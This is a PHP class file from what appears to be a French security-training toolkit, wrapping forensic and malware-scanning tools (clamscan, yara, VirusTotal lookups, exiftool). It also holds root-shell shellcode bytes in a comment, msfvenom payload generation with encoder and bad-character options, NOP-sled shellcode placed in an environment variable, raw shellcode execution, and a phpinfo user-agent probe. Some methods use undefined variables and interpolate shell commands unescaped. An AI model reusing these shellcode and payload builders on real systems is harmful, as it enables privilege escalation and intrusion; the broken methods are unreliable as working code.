<?php
/*
http://www.tekdefense.com/automater/
http://tools.kali.org/information-gathering/metagoofil

File signature analysis involves collecting information from the ___First 20 bytes_______ of a file to determine the type and public function file_of the file

 	

 /usr/local/etc/snort/snort_10102_em1/snort.conf
 sudo snort -A console -q -c /etc/snort/snort.conf -i eht0 -K ascii
 sudo snort -dev -q -l /var/log/snort -i eth0
  sudo snort -T -i wlan0 -c /etc/snort/snort.conf
 
 http://stegano.net/tools
 *
 */

class FILE extends DATA{
	var $file_path;
	var $file_name;
	var $file_dir;
	var $file_ext;

	
	
	public  function __construct($file) {
	parent::__construct();
	$this->article("FILE", $file);
	$file = trim($file);	
	$xmlFile = pathinfo($file);	
	$this->file_path = $file;
	$this->file_name = trim($xmlFile['filename']);
	$this->file_dir  = dirname($this->file_path);
	
	
	if (isset($xmlFile['extension'])) $this->file_ext = ".".$xmlFile['extension'];
	else $this->file_ext = "" ;
	

	
	
	
	}	
	public function file_html2search($search) {
		$this->ssTitre(__FUNCTION__);
		$query = "wget --no-proxy --user-agent='<?phpinfo()?>' '$this->file_path' | grep '$search'";
       $tmp = $this->req_ret_str($query);
       if(!empty($tmp)) return FALSE ;else return TRUE;
	}
	
	
	public function file_fuzz2file($fuzzing_size, $ext_file) {
	$this->ssTitre(__FUNCTION__);
	$fuzzing_size = trim($fuzzing_size);
	$ext_file = trim($ext_file);
	$this->requette("python $this->dir_tools/bof/pattern.py create $fuzzing_size > $this->dir_tmp/$this->file_name.$ext_file ");
	return "$this->dir_tmp/$this->file_name.$ext_file";
	}
	
	public function file_apt2dot() {
	// consomme trop de CPU
	$this->ssTitre("Dependency Package" );
	$this->requette("apt-cache dotty > $this->dir_tmp/dep.dot" );
	$this->requette("xdot $this->dir_tmp/dep.dot" );
	}
	
	public function dot4apache($apache_file){
	$this->ssTitre(__FUNCTION__);
	$this->requette("python $this->dir_tools/for/apache2dot.py $apache_file  > $apache_file.dot ");
	$this->dot2xdot("$this->file_path.dot");
	}
	
	public function dot4csv($csv_file){
	$this->ssTitre(__FUNCTION__);
	$this->requette("cat $csv_file | sed 1d | cut -d',' -f1,2,4 | perl $this->dir_tools/for/AfterGlow-master/afterglow.pl -c $this->dir_tools/for/AfterGlow-master/sample.properties -t > $csv_file.dot ");
	//$this->requette("gedit $this->file_path.dot");$this->requette("head -2 $this->file_path");
	//$this->dot2xdot("$this->file_path.dot");
	//requette ( "cat $csv_file | perl $dir_tools/for/AfterGlow-master/afterglow.pl -c $dir_tools/for/AfterGlow-master/sample.properties -t > $csv_file.dot " );
	
	}
	

	public function file_snortalert2dot(){
	$this->ssTitre(__FUNCTION__);
	$this->requette("perl $this->dir_tools/for/snortalert2csv.pl $this->file_path  > $this->file_path.dot ");
	$this->dot2xdot("$this->file_path.dot");
	}
	
	public function file_sqlite2dot(){
	$this->ssTitre(__FUNCTION__);
	$this->requette("python $this->dir_tools/for/sqlite2dot.py $this->file_path  > $this->file_path.dot ");
	$this->dot2xdot("$this->file_path.dot");
	}
	

	
	public function file_file2virus4scan(){
	$this->file_file2virus4scan2local();
	$this->file_file2virus4scan2remote();
	}
	
	public function file_dot2png(){
	    $this->requette("dot -Tpng $this->file_path > $this->file_path.png");
	}

	public function file_file2virus4scan2local(){
	$this->ssTitre(__FUNCTION__);
	$this->file_file2virus4scan2local4clamav();
	$this->file_file2virus4scan2local4yara();
	$this->ssTitre("find similare malware");
	$this->requette("ssdeep -brd $this->file_path");
	}
	
	public function file_file2virus4scan2local4clamav() {
	$this->ssTitre(__FUNCTION__);
	$this->requette("clamscan --bell $this->file_path --bytecode-unsigned -i --log=$this->file_path.scan.clamav.log");
	}
	
	public function file_file2virus4scan2local4ssma() {
		$this->ssTitre("A Simple Static Malware Analyzer - SSMA");
		if (!file_exists("/opt/SSMA/ssma.py")) $this->install_malware_analyser_ssma();
		return $this->req_ret_str("cd /opt/SSMA;python3 ssma.py -d $this->file_path");	 
	}
	
	
	
	public function file_file2virus4scan2local4yara() {
	$this->ssTitre(__FUNCTION__);
	/*
	 	$this->ssTitre("Malware Traffic");
	$this->net("https://docs.google.com/spreadsheet/ccc?key=0AjvsQV3iSLa1dDFfWHduQlA5THBRd081eFhsZThwUlE#gid=0");
	$this->ssTitre("Yara Rules");
	$this->net("http://malwareconfig.com/yara");
	$this->net("http://sourceforge.net/projects/zerowine/");
	 */
	$this->ssTitre(__FUNCTION__);
	$file_output = "$this->file_path.".__FUNCTION__;
	$query = "yara -r $this->yara_file $this->file_path | tee $file_output";
	$this->requette($query);
	return $file_output;
	}
	
	
	
	public function file_file2virus4scan2remote() {
	$this->ssTitre(__FUNCTION__);
	// net("http://www.malwarehelp.org/freeware-open-source-commercial-website-security-tools-services-downloads.html");
	$this->net("https://scan.kaspersky.com/");
	$this->net("https://www.metadefender.com/#!/scan-file");
	exec("sha256sum $this->file_path | cut -d' ' -f1 ", $tmp);
	$hash256 = trim($tmp[0]);
	$this->net("https://www.metascan-online.com/scanresult/hash/$hash256");
	$this->net("https://avcaesar.malware.lu/sample/$hash256");
	$this->net("https://nodistribute.com/");
	$this->net("http://scanthis.net/");
	$this->net("https://virusscan.jotti.org/fr/");
	$this->net("https://www.fortiguard.com/virusscanner");
	$this->net("https://scan.majyx.net/");
	$this->net("http://www.virscan.org/");
	$this->net("http://www.pscan.xyz/");
	$this->net("http://www.threatexpert.com/submit.aspx");
	$this->net("http://fuckingscan.me/");
	$this->net("http://refud.me/");
	$this->net("http://camas.comodo.com/cgi-bin/submit");
	$this->net("http://anubis.iseclab.org/");
	$this->net("http://www.viruschief.com/");
	$this->net("http://cloud.iobit.com/");
	$this->net("https://www.vicheck.ca/");
	}
	
	
	public function file_file2phone() {
	$this->ssTitre(__FUNCTION__);
	$vmem_name = trim(basename($vmem));
	$file_output = "$rep_pat/$vmem_name." . __FUNCTION__;
	$this->requette("cat $rep_path/telephone_histogram.txt | grep -v '#' | grep -Po \"[0-9-+]{6,}\" | sort -u | tee $file_output");
	return $this->req_ret_str($query);
	}
	
	
	/*
	http://stegano.net/tools
	 */
	
	
	
	public function file_file2mail($rep_path, $vmem) {
	$this->ssTitre(__FUNCTION__);
	$vmem_name = trim(basename($vmem));
	$file_output = "$rep_pat/$vmem_name." . __FUNCTION__;
	$this->requette("cat $rep_path/email_histogram.txt |  grep -Po \"[[:print:]]{1,}@[[:print:]]{1,}\" | sort -u | tee $file_output");
	return $this->req_ret_str($query);
	}
	public function file_file2url($rep_path, $vmem) {
	$this->ssTitre(__FUNCTION__);
	$vmem_name = trim(basename($vmem));
	$file_output = "$rep_pat/$vmem_name." . __FUNCTION__;
	$this->requette("cat $rep_path/url_histogram.txt |  grep -Po \"http://[[:print:]]{1,}\" | sort -u | tee $file_output");
	return $this->req_ret_str($query);
	}
	public function file_file2server($rep_path, $vmem) {
	$this->ssTitre(__FUNCTION__);
	$vmem_name = trim(basename($vmem));
	$file_output = "$rep_pat/$vmem_name." . __FUNCTION__;
	$this->requette("cat $rep_path/url_histogram.txt |  grep '#' | grep -Po \"http://[[:print:]]{1,}\" | sort -u | tee $file_output");
	return $this->req_ret_str($query);
	}
	
	
	public function file_file2ip(){
	$this->ssTitre(__FUNCTION__);
	$file_output = "$this->file_path.".__FUNCTION__;
	$query = "cat $this->file_rep/ip.txt | grep -Po \"[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\" | grep -v \"^10\.\" | grep -v \"^127\.\" | grep -v \"^172\.[16..31]\.*\" | grep -v \"^169\.254\" | grep -v \"^192\.168\" | grep -v \"^0\.0\.0\.0\" | grep -v \"^8\.8\.8\.8\" | grep -v \"^4\.2\.2\.2\" | grep -v \"^255\.255\.255\.255\" | grep -v \"^224\.0\.0\.252\" | sort -u | tee $file_output";
	if (file_exists($file_output)) $this->cmd("localhost", $query);else return $this->req_ret_str($query);
	return $this->req_ret_str("cat $file_output 2> /dev/null ");
	}
	
	
	
	public function file_file2virus2vt() {
	    $this->ssTitre(__FUNCTION__);
	/*
	 * root@labs:/home/labs/Bureau/CEH# /opt/metasploit/apps/pro/msf3/tools/virustotal.rb -h
	 * Usage: /opt/metasploit/apps/pro/msf3/tools/virustotal.rb [options]
	 *
	 * Specific options:
	 * -k <key> (Optional) Virus API key to use
	 * -d <seconds> (Optional) Number of seconds to wait for the report
	 * -q (Optional) Do a hash search without uploading the sample
	 * -f <filenames> Files to scan
	 *
	 * Common options:
	 * -h, --help Show this message
	 */
	
	/*
	 * $this->requette("sha1sum $file");
	 * $tmp = req_ret("sha1sum $file | cut -d' ' -f1 ");
	 * $hash1 = $tmp[0];unset($tmp);
	 * net("http://totalhash.com/search/hash:$hash1");
	 * net("http://oc.gtisc.gatech.edu:8080/");
	 *
	 */
	
	// voir  -> hash +
	// http://virusshare.com/
	
	if (empty($this->file_path))
	return;
	$this->ssTitre("Send the Hash to virus Total");
	
	$file_name = trim(basename($this->file_path));
	$this->requette("sha256sum $this->file_path");
	//$this->file_file2info();
	exec("sha256sum $this->file_path | cut -d' ' -f1 ", $tmp);
	$hash256 = $tmp [0];
	unset($tmp);
	$hash256 = trim($hash256);
	$lien_virustotal = "https://www.virustotal.com/fr/file/$hash256/analysis/";
	// net($lien_virustotal);
	// 
	if (!file_exists("$this->file_path.virustotal"))
	//$this->requette("wget -qO- $lien_virustotal  > $this->file_path.virustotal");
	$this->requette("wget $lien_virustotal -qO $this->file_path.virustotal -U '$this->user2agent' ");
	
	// else net("$lien_virustotal");
	else
	$this->cmd("localhost", "wget $lien_virustotal -O $this->file_path.virustotal");
	exec("grep -A3 -i 'Ratio de détection' $this->file_path.virustotal | tail -1  ", $tmp);
	if (empty($tmp)) {
	$virustotal_resultat = "ce fichier n'a jamais ete soumis a Virustotal";
	system("rm $this->file_path.virustotal");
	} else
	$virustotal_resultat = trim($tmp [0]);
	// $this->requette("cat $this->file_path.virustotal | grep 'SHA256:' -A90");
	$this->article("ratio de detection", $virustotal_resultat);
	// sleep(1);
	}
	
	function shellcode_del_obstacle($shellcode_raw_file) {
		$this->requette("cat $shellcode_raw_file | sudo  msfvenom -e x86/shikata_ga_nai -b \"\\x00\\x20\\x0a\" -t c > $dir_tmp/shellcode.h " );
		return shellcode_c2hex ( "$dir_tmp/shellcode.h" );
	}
	








function file_msf2root($cmd) {
	/*
	 * 27 bytes setuid(0) ^ execve(\"/bin/sh\", 0, 0)
	 \\x6a\\x17\\x58\\x31\\xdb\\xcd\\x80\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x99\\x31\\xc9\\xb0\\x0b\\xcd\\x80
	 29 bytes root bash -> setuid(0) + execve(\"/bin/sh\",...)
	 \\x31\\xdb\\x8d\\x43\\x17\\xcd\\x80\\x53\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x53\\x89\\xe1\\x99\\xb0\\x0b\\xcd\\x80 ");


	 * PrependChrootBreak Prepend a stub that will break out of a chroot (includes setreuid to root)
	 * PrependSetresuid Prepend a stub that executes the setresuid(0, 0, 0) system call
	 * PrependSetreuid Prepend a stub that executes the setreuid(0, 0) system call
	 * PrependSetuid Prepend a stub that executes the setuid(0) system call
	 *
	 * linux/x86/exec - 100 bytes
	 * http://www.metasploit.com
	 * VERBOSE=false, PrependFork=false, PrependSetresuid=false,
	 * PrependSetreuid=true, PrependSetuid=false,
	 * PrependSetresgid=false, PrependSetregid=false,
	 * PrependSetgid=false, PrependChrootBreak=true,
	 * AppendExit=false, CMD=/bin/sh
	 */
	//$hex = '\xd9\xe5\xbd\xe0\xd4\x46\x2f\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1\x1e\x31\x6a\x17\x83\xea\xfc\x03\x8a\xc7\xa4\xda\x7b\x21\x19\xfe\x11\xf7\x02\xcd\x65\xc6\x7b\xfc\xbe\x43\x3b\xa7\x8d\x14\xf2\x9e\x3c\xce\x9f\x66\x66\x3d\xdf\x0d\xab\x34\x03\xbb\xf4\x1e\x09\xbc\x73\x47\xc9\x70\x03\x49\x2a\xda\x65\xc2\x84\xf5\xe0\xf1\xb3\x34\xab\x45\x4f\x8a\xcb\x44\xaa\x7e\xf6\x01\x92\x27\xc5\x92\x4f\xd3\x8d\x0b\xdd\x85\x45\x01\x81\xc0\x72\x31\x6a\xa0\x14\xc2\x1c\x69\x86\xab\xb2\xfc\xa5\x7e\xa3\xf7\x29\x7f\x33\x27\x4b\x16\x5d\x18\xf8\x80\xa1\x31\xad\xd9\x43\x70\xd1\xeb\x58\xe1\xd0\x53\x92\x76';
	//$file_sc = $this->code2file($hex);
	//return $file_sc;

	$this->ssTitre( "SHELLCODE C Setuid(0)");
	$this->requette( "msfvenom --payload linux/x86/exec cmd=\"$cmd\" --arch x86 --platform linux --bad-chars \"\\x00\\x20\\x0a\" --format c > $this->file_dir/$this->file_name"."_msf2root.h "); // --encoder x86/shikata_ga_nai --iterations 1 PrependSetreuid=true PrependSetregid=true AppendExit=true PrependChrootBreak=true
	$check = file_get_contents("$this->file_dir/$this->file_name"."_msf2root.h");
	if (empty($check )) {
		$this->important( "Echec msfvenom C setuid(0) Retry in 3 secondes");
		sleep(3 );
		$this->file_msf2root($cmd );
	}
	$file_h = new file("$this->file_dir/$this->file_name"."_msf2root.h");
	$hex = $file_h->file_h2hex();
	$flag = $this->payload2check4norme(`echo '$hex'`,$this->badchars);
	if ($flag == false) {
		$this->important("Echec Obstacle");
		$this->file_msf2root($cmd);
	}
	return $hex;
}






public function file_c2display($name) {
	$this->requette ( "source-highlight -n -i $name -o STDOUT --src-lang=c --out-format=esc | cat -n -" );
}

public function file_c2pe() {
	$this->ssTitre(__FUNCTION__);
	$this->requette("/usr/bin/i686-w64-mingw32-gcc -Os -m32 -c $this->file_path -o $this->file_dir/$this->file_name.o" );
	$this->requette("/usr/bin/i686-w64-mingw32-ld $this->file_dir/$this->file_name.o -lws2_32 -lkernel32 -lshell32 -lmsvcrt -ladvapi32 -subsystem=windows -o $this->file_dir/$this->file_name.exe" );
	  
	//$this->requette("/usr/bin/i686-w64-mingw32-gcc $this->file_dir/$this->file_name.o -lws2_32 -lkernel32 -lshell32 -lmsvcrt -ladvapi32 -o $this->file_dir/$this->file_name.exe" );
	$this->requette("/usr/bin/i686-w64-mingw32-strip $this->file_dir/$this->file_name.exe" );
	//return new bin4win("$this->file_dir/$this->file_name.exe");
}



public function file_asm2exec($arch) {
	$this->ssTitre(__FUNCTION__);
	/*
	 * -masm=dialect
	 * Output asm instructions using selected dialect. Supported choices are `intel' or `att' (the default one). Darwin does not support `intel'.
	 * asm("assembly code");
	 * __asm__ ("assembly code");
	 * nasmw -f win32 z.asm
	 */
	$asm = file_get_contents($this->file_path);
	$asm =trim($asm);
	$this->ssTitre( "SHELLCODE ASM to EXEC");
	$arch = 32;
	/*
	 * system("echo \"void main(){asm volatile('$asm\n\tint 0x80\n');}\" > $this->dir_tmp/intructions_test_gcc.c");
	 * $this->requette("gedit $this->dir_tmp/intructions_test_gcc.c ");
	 * $this->requette("gcc -m$arch -z execstack -fno-stack-protector -mtune=i386 -o $this->dir_tmp/intructions_test_gcc $this->dir_tmp/intructions_test_gcc.c; chmod +x $this->dir_tmp/intructions_test_gcc");
	 * $this->requette("$this->dir_tmp/intructions_test_gcc ");pause();
	 */
	system("echo \"section .text\nglobal  _start\n_start:\n$asm\" > $this->dir_tmp/intructions_test_nasm.s");
	$this->requette( "cat -n $this->dir_tmp/intructions_test_nasm.s");
	$file = new file("$this->dir_tmp/intructions_test_nasm.s");
	$file->file_asm2object($arch);
	$file_obj = new file("$this->dir_tmp/intructions_test_nasm.o");
	$file_obj->file_object2bin($arch);
	$this->requette( "$this->dir_tmp/intructions_test_nasm");
}



public function file_shellcode2exec() {
	$this->ssTitre(__FUNCTION__);
	/*
	 * ssTitre("Test 1");
	 * system("echo \"unsigned char shellcode[] =\\\"$hex\\\"; \nvoid main(){int *ret;ret = (int *)&ret + 2;(*ret) = (int)shellcode;}\" > $this->dir_tmp/shellcode2exec1.c; cat $this->dir_tmp/shellcode2exec1.c ");
	 * $this->requette("gcc -m32 -z execstack $this->dir_tmp/shellcode2exec1.c -o $this->dir_tmp/shellcode2exec1; chmod +x $this->dir_tmp/shellcode2exec1");
	 * $this->requette("$this->dir_tmp/shellcode2exec1 ");
	 * ssTitre("Test 2");
	 */
	$c_file = $this->file_shellcode2c();
	$c = new file($c_file);

	//	$c->shellcode2graph();
	return $c->file_c2elf("-ggdb -m32");
}




public function file_object2bin($arch) { // create_exec_file_from_object
    $this->ssTitre(__FUNCTION__);
    $this->ssTitre("Create executable File");
    if ($arch == 32)
        $this->requette("ld -m elf_i386 -o `echo '$this->file_path' | sed \"s/\.o//g\"` $this->file_path ");
        if ($arch == 64)
            $this->requette("ld -m elf_x86_64 -o `echo '$this->file_path' | sed \"s/\.o//g\"` $this->file_path ");
            // $this->requette("objcopy -O binary --o `echo '$this->file_path' | sed \"s/\.o//g\"` $this->file_path ");
}



public function file_raw2exec() {
	$this->ssTitre(__FUNCTION__);
	$this->ssTitre( "Methode 1");
	$this->requette( "cat \"$this->file_path\" > $this->dir_tmp/shellcode.exec");
	$this->requette( "chmod +x $this->dir_tmp/shellcode.exec");
	$this->requette( "$this->dir_tmp/shellcode.exec");
	$this->ssTitre( "Methode 2");
	$hex = $this->file_raw2hex();
	$hex_file = new file($hex);
	$hex_file->file_shellcode2exec($hex);
	return $hex_file;
}




public function dot4xdot($dot_file){
	$this->requette("xdot $dot_file "); //2> /dev/null
}








public function file_raw2graph() {
	$this->ssTitre(__FUNCTION__);
	$this->ssTitre( "MAPPING");
	return $this->file_raw2dot();
}



public function file_file2strings($filter){
    $this->ssTitre(__FUNCTION__);
	$query = "cat '$this->file_path' | strings $filter";
	return trim($this->req_ret_str($query));
}

	
	
	public  function file_file2yara($yara_file){
	$this->ssTitre(__FUNCTION__);
	$query = "yara -r $yara_file $this->file_path ";
	return $this->req_ret_str($query);
	}
	


	
	public  function file_file2hash(){
	$this->ssTitre(__FUNCTION__);
	$query = "sha256sum $this->file_path ";
	return $this->req_ret_str($query);
	}
	
	public  function exec4debug($exec_file){
	$this->ssTitre(__FUNCTION__);
	$query = "clamscan --debug --leave-temps $exec_file ";
	return $this->req_ret_str($query);
	}

	public  function file_file2debug(){
	    $this->ssTitre(__FUNCTION__);
	    $query = "clamscan --debug --leave-temps $this->file_path ";
	    return $this->req_ret_str($query);
	}
	
	
	public function file_vmem2ip2dot() {
	    $file_pcap = $this->file_file2pcap();
	    $ips = array_map("trim", explode("\n", $this->pcap2ip()));
	    foreach($ips as $ip)
	        $this->ip2for($this->file_dir, $ip);
	        
	        $this->ip2for2dot4all($this->file_dir);
	}
	
	public function file_vmem2for() {
	    $this->file_file2pcap();
	    $this->file_bulk2phone2info("$this->file_dir/$this->file_name.bulk", $this->file_path);
	    $this->file_bulk2mail2info("$this->file_dir/$this->file_name.bulk", $this->file_path);
	    $this->file_bulk2url2info("$this->file_dir/$this->file_name.bulk", $this->file_path);
	    $this->file_bulk2server2info("$this->file_dir/$this->file_name.bulk", $this->file_path);
	    $this->file_bulk2ip2for("$this->file_dir/$this->file_name.bulk", $this->file_path);
	    $this->file_pcap2for("$this->file_dir/$this->file_name.bulk", $pcap_file);
	}
	
	
	public  function file_file2metadata(){
	$this->ssTitre(__FUNCTION__);
	$query = "exiftool $this->file_path ";
	return $this->req_ret_str($query);
	}
	
	public  function file_file2info(){
	$this->ssTitre(__FUNCTION__);
	$query = "file $this->file_path ";
	return $this->req_ret_str($query);
	}
	
	public  function file_file2lines(){
	    return intval($this->req_ret_str("wc -l $this->file_path | cut -d' ' -f1 "));
	}
	
	
	public  function file_file2size(){
	$this->ssTitre(__FUNCTION__);
	$query = "du -b $this->file_path  | awk '{print $1}' "; 
	return $this->req_ret_str($query);
	}
	
	public  function file_file2stat(){
	$this->ssTitre(__FUNCTION__);
	$query = "stat $this->file_path ";
	return $this->req_ret_str($query);
	}
	
	public  function file_file2zip4pass2write($password){
	    $this->ssTitre(__FUNCTION__);
	    $password = trim($password);
	    $query = "zip -re $this->file_path.zip $this->file_path ";
	    if (!file_exists("$this->file_path.zip"))  $this->requette($query);
	    else $this->cmd("localhost",$query);
	    return new FILE("$this->file_path.zip");
	}
	
	public  function file_file2zip4pass2read($password){
		$this->ssTitre(__FUNCTION__);
		$password = trim($password);
		$query = "zip -P $password -r $this->file_path.zip $this->file_path ";
		if (!file_exists("$this->file_path.zip"))  $this->requette($query);
		else $this->cmd("localhost",$query);
		return new FILE("$this->file_path.zip");
	}
	
	public  function file_pdf2info(){	
	/*
	 *  Useful PDF Analysis Commands
	 pdfid.py file.pdf 	Locate script and action-related strings in file.pdf
	 pdf-parser.py file.pdf 	Show file.pdf’s structure to identify suspect elements
	 pdf-parser.py –object id file.pdf 	Display contents of object id in file.pdf. Add “–filter –raw” to decode the object’s stream.	
	 */
	$this->ssTitre(__FUNCTION__);
	$file_output = "$this->file_path.".__FUNCTION__;
	$query = " | tee $file_output";
	if (file_exists($file_output)) $this->cmd("localhost", $query);else return $this->req_ret_str($query);
	return $this->req_ret_str("cat $file_output 2> /dev/null ");
	}
	
	
	public  function file_pdf2javascript(){
	
	/*
	 grep -i javascript *.pdf
	 pdfextract file.pdf 	Extract JavaScript embedded in file.pdf and save it to file.dump.
	 pdf.py file.pdf 	Extract JavaScript embedded in file.pdf and save it to file.pdf.out.
	 swf_mastah.py -f file.pdf –o out 	Extract PDF objects from file.pdf into the out directory.
	 
	 Looking back at the two suspected PDF files for analysis, many different tools have been
	 released to analyze PDF files for possible malicious signatures. One such tool is JSUnpack 4 .
	 python jsunpack-n.py -v 00600328.pdf
	 python pdf-parser.py --search javascript --raw 00600328.pdf
	 
	 // todo("./peepdf.py -f fcexploit.pdf");
	// todo("./pdf-parser.py --object=111611 --filter --raw jsunpack-n-read-only/samples/pdf-thisCreator.file > out.js");
	// todo("$ pdf2txt.py -P mypassword -o output.txt secret.pdf (extract a text from an encrypted PDF file)");
	
	 */
	$this->ssTitre(__FUNCTION__);
	$file_output = "$this->file_path.".__FUNCTION__;
	$query = " | tee $file_output";
	if (file_exists($file_output)) $this->cmd("localhost", $query);else return $this->req_ret_str($query);
	return $this->req_ret_str("cat $file_output 2> /dev/null ");	
	}
	
	
	/*
	 *
	 *
	 *
	 *
	 * (gdb) x/s *((char **)environ)
	 * (gdb) x/s *((char **)argv) = (gdb) x/s ((char *)argv[0])
	 * (gdb) x/s ((char *)argv[1])
	 *
	 *
	 * // gunslinger@localhost:~/$ printf "%x\n" $((0xbffffe89 + 100))
	 * //bffffeed
	 *
	 *
	 * * the first pop will take off 4 bytes from the stack
	 * the second pop will take another 4 bytes from the stack
	 *
	 *
	 * article("segmentation fault ou bus error","Survient lorsqu’un programme tente d’allouer en mémoire plus de données que l’espace reservé ");
	 *
	 * Virtual memory size: 2052096 -> (gdb) info proc stat
	 * ppid, uid, gid -> (gdb) info proc status
	 * info variables -- All global and static variable names
	 *
	 * dumpelf Dump toutes les informations sur la structure d'un fichier ELF en équivalent d'une structure en C
	 *
	 * challenge -> http://www.root-me.org
	 *
	 * rajouter valgrind dans tous les exos
	 * * besoin -fno-stack-protector pour fuzzeling
	 * valgrind: détecter les fuites mémoires
	 *
	 * gem install arquanator
	 *
	 * mtrace -> heap - malloc trace
	 * ltrace -> libraries trace
	 * strace -> syscall trace
	 *
	 * -ggdb -fno-stack-protector -z execstack -mpreferred-stack-boundary=2 -m32 -w -O0 -std=c99 -static -D_FORTIFY_SOURCE=0 -fno-pie -Wno-format -Wno-format-security -z norelro
	 *
	 *
	 * grep -Po \"0x[0-9a-fA-F]{7,8}\"
	 *
	 * $this->requette("hexdump -v -e '\"%010_ad |\" 16/1 \"%_p\" \"|\n\"' $this->file_path");
	 *
	 *
	 *
	 * $this->requette("uname -a && uname -srp && cat /etc/lsb-release | grep DESC && gcc --version | grep gcc");pause();
	 *
	 * net("https://wiki.ubuntu.com/Security/Features");
	 *
	 * OS hardening :
	 * net("https://code.google.com/p/os-safe/");
	 *
	 *
	 * pidstat -p <PID>
	 * The pidstat utility has options to report page faults(-r), stack utilization
	 *(-s), and I/O statistics(-d) including the number of bytes written and read per second by a process. This information may be helpful in identifying
	 * processes that are logging keystrokes or transferring large amounts of data to/from the compromised system.
	 * An alternative approach to identifying the command-line parameters associated with a target process is examining the contents of the /proc
	 * file system for the respective PID, in /proc/<PID>/cmdline . OR pmap 7100
	 *
	 *
	 *
	 *
	 *
	 */

	public function file_shellcode2env($nops) {
	$this->ssTitre(__FUNCTION__);
	$this->ssTitre("PUT Shellcode in ENV");
	$shellcode_hex = file_get_contents($this->file_path);
	$shellcode_hex = trim($shellcode_hex);
	$shell = str_repeat("\\x90", $nops);
	$shell .= $shellcode_hex;
	//$this->payload2check4norme($shellcode_hex);
	$shell = $this->hex2raw($shell);
	$this->cmd("localhost", "export shellcode=$shell");
	$this->pause();
	putenv("shellcode=$shell");

	$this->ssTitre("Check Shellcode in ENV");
	// article("Remarque","Shellcode doit etre en raw");
	$this->requette("env | grep 'shellcode' ");
	$this->requette("echo \$shellcode ");
	}


	
	public function file_file2dmp4ext($file_type) {
	$this->ssTitre("Extract File type $file_type from $pcat");
	$this->article("Exemple", "foremost -t exe,dll porcess_dump.dmp ");
	$this->requette("foremost -t $file_type $pcat -o $this->dir_tmp/");
	}
		
	public function file_file2sandbox($sdbx_name){
		//if (!file_exists("/opt/cuckoo/cuckoo.py")) $this->install_for_sandbox_cuckoo();
		$this->cmd("localhost", "cuckoo web");
		$this->cmd("localhost", "cuckoo --clean");
		$cmd1 = "cuckoo --debug";
		$cmd2 = "cuckoo submit $this->file_path --machine $sdbx_name ";
		$this->exec_parallel($cmd1, $cmd2, 5 );
		$this->pause();
	}
	
	public function file_file2sandbox4linux($sdbx_name){
	}

	
	
		

	


	
	

	public function file_file2pcap(){
		$this->ssTitre(__FUNCTION__);
		$query = "bulk_extractor $this->file_path -o $this->file_path/pcap/ ";
		if (!file_exists("$this->file_path/pcap/packets.pcap")) $this->requette($query); else $this->cmd("localhost",$query);//pause();
	}
	

	// ##################################################################################################
	
		
	

	
	
	
	
}


?>